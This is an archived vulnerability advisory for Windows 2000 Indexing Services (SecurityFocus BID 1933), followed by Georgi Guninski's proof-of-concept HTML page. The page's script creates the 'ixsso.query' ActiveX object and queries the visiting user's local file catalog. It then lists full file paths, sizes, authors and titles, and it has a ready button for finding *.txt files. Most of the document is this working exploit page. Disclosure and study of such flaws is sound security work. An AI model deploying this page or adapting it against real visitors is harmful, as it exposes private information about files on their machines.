@@ -1,0 +1,88 @@
+source : http://www.securityfocus.com/bid/1933/info
+
+Microsoft Windows 2000 Indexing Services is a search engine that will allow a user to perform full-text searches of online sites using their browsers. Search results include Word, Excel, PowerPoint, and HTML documents. By default, this service is not enabled in Windows 2000.
+
+A malicious website operator may verify the existence of files residing on a Windows 2000 system with Indexing Services enabled. The website operator is capable of searching for specific files by using the Indexing Services via specially malformed HTML containing the ActiveX Object 'ixsso.query'. Query results will display the full physical path of the file and will only be retrieved from directories that have been explicitly configured as searchable directories within the Indexing Service.
+
+Successful disclosure of a file's availability may aid in more severe attacks against the target system.
+
+
+<HTML>
+<HEAD>
+<TITLE>
+Demo - IE 5.x Win2000 Indexing service vulnerability
+</TITLE>
+</HEAD>
+<BODY>
+Demo - IE 5.x Win2000 Indexing service vulnerability
+<BR>
+<p>Legal Notice:
+<br>This Advisory and Demonstration is Copyright (c) 2000 Georgi Guninski. You may distribute
+it unmodified. You may not modify it and distribute it or distribute parts
+of it without the author's written permission.
+<p>Disclaimer:
+<br>The opinions expressed in this advisory and program are my own and
+not of any company.
+<br>The usual standard disclaimer applies, especially the fact that Georgi
+Guninski
+<br>is not liable for any damages caused by direct or&nbsp; indirect use
+of the information or functionality provided by this advisory or program.
+<br>Georgi Guninski, bears no responsibility for content or misuse of this
+advisory or program or any derivatives thereof.
+<BR>
+<A HREF="indexserv1-desc.html">Advisory</A>
+<BR>
+<BR>
+Search for files containing: <INPUT NAME="query" TYPE="text">
+<INPUT TYPE="BUTTON" VALUE="Search" onclick="g(document.all.query.value)">
+<INPUT TYPE="BUTTON" VALUE="Find *.txt files" onclick="g('@filename = *.txt')">
+<BR>
+<SCRIPT>
+function g(q1)
+{
+
+qu=new ActiveXObject("ixsso.query");
+
+qu.Catalog="System";
+//qu.query="@contents name";
+//qu.query="#filename .htm or name near test";
+//qu.query='@filename = *.doc ';
+qu.query=q1;
+
+qu.Columns="filename, path, doctitle, doccomments, docauthor, size";
+
+rs=qu.CreateRecordset("nonsequential");
+//alert("Records: "+rs.RecordCount);
+
+doc=window.frames[0].document;
+doc.writeln("SEARCH RESULTS Records: "+rs.RecordCount+"<BR>");
+doc.writeln("<TABLE BORDER=2>");
+doc.writeln("<TR><TD>Path</TD><TD>size</TD><TD>DocAuthor</TD><TD>DocTitle</TD></TR>");
+while (!rs.EOF)
+{
+doc.writeln("<TR><TD><A TARGET='_blank' HREF='file://"+rs("Path")+"'</A>"+rs("Path")+"</TD><TD>"+rs("size")+"</TD><TD>"+rs("DocAuthor")+"</TD><TD>"+rs("DocTitle")+"</TD></TR>");
+rs.MoveNext();
+}
+doc.writeln("</TABLE>");
+
+}
+//setTimeout("g()",1000);
+</SCRIPT>
+
+<IFRAME WIDTH=700 HEIGHT=400 SRC="about:blank"></IFRAME>
+
+
+
+<center>(C) Copyright 2000 Georgi Guninski</center>
+<BR>
+<center>
+| <a href="http://www.guninski.com">Home</a> | 
+<a href="browsers.html">Internet Explorer</a> | 
+<a href="win2k.html">Windows 2000</a> | 
+<a href="exploit.html">AIX</a> | 
+<a href="netscape.html">Netscape</a> | 
+<a href="greets.html">Greets</a> | 
+<a href="index.html">More...</a> | 
+</center>
+</BODY>
+</HTML>
